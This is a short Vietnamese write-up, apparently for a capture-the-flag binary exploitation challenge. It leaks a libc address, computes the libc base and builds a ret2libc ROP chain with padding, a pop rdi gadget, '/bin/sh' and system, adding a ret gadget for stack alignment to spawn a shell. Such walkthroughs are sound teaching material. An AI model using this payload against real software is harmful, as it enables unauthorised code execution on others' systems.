# Tìm địa chỉ base libc
Trong stack có các địa chỉ libc có thể được leak ra qua hàm print

<img width="1802" height="815" alt="image" src="https://github.com/user-attachments/assets/0195181f-c914-41bd-8c43-9c22e9f6ec98" />

Có địa chỉ libc và tên symbol thì ta tính được base của libc qua công thức:

    libc.address = leak_libc - libc.sym['_IO_2_1_stderr_']

sau đó là tính địa chỉ thực của gadget pop rdi đưa  `/bin/sh` vào làm argument đầu tiên khi gọi system

    pop_rdi=libc.address+0x00000000000277e5

    payload=b'A'*264
    payload+=p64(pop_rdi)+p64(next(libc.search(b'/bin/sh\0')))
    payload+=p64(libc.sym['system'])

Tuy nhiên khi chạy thử thì bị lỗi

<img width="1905" height="805" alt="image" src="https://github.com/user-attachments/assets/20021471-63c0-447c-b4db-feaf5104372f" />

Điều này là do ta nạp vào payload 3 lần 8 byte làm cho địa chỉ stack không chia hết cho 16
Cần phải thêm 1 lệnh nhảy ret tại chỗ để cho địa chỉ hợp lệ

    ret=libc.address+0x0000000000026e99
    payload+=p64(ret)

Lúc này đã có thể gọi lệnh tạo shell

<img width="1281" height="1082" alt="image" src="https://github.com/user-attachments/assets/caff9648-9686-4578-b21a-6a2694114140" />

